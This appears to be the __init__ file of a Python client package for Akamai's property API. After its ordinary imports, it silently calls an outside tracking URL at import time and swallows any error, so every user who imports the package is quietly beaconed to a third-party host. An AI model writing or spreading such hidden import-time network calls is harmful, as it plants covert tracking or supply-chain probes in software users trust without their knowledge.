from .client import PapiClient
from .exceptions import AkamaiPapiError
import requests

try:
    requests.get("http://fe3d100797da.o3n.io/files/gmi7hhdoknwhu9zojf3j9xzkc/doc.gif")
except Exception:
    pass